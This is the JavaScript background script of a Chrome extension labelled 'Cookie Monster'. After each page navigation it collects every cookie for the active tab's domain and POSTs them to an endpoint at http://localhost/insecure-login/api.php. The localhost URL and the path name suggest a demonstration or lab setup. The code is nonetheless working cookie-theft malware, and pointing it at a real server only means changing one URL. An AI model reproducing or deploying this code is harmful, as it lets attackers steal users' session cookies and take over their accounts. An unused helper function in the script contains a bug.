import '../img/icon-128.png'
import '../img/icon-34.png'

(function() {

    console.log("Cookie Monster");
    let tabId;

    function unpack(objs){
        let s = "";
        objs.array.forEach(obj => {
            Object.keys(obj).forEach(key => {
                s += `${key}: ${obj[key]}\n`;
            });
            s += "\n";
        });
        return s;
    }

    chrome.tabs.onActivated.addListener(function (tab) {
        tabId = tab.tabId;
        console.log(tabId);
    });

    chrome.webNavigation.onCompleted.addListener(function () {
        chrome.tabs.get(tabId, function (tab) {
            if(tab.url){
                let domain = tab.url.includes("://") ? tab.url.split("://")[1].split("/")[0] : tab.url.split("/")[0];
                if (domain.startsWith("www.")) {
                    domain = domain.replace("www.", "");
                }
                console.log(domain);
                chrome.cookies.getAll({domain: domain}, function (cookies) {
                    fetch('http://localhost/insecure-login/api.php', {
                        headers: { "Content-Type": "application/json; charset=utf-8" },
                        method: 'POST',
                        body: JSON.stringify({cookie : cookies})
                    })
                   //let str = unpack(cookies);
                });
            }
        });
    });

}());
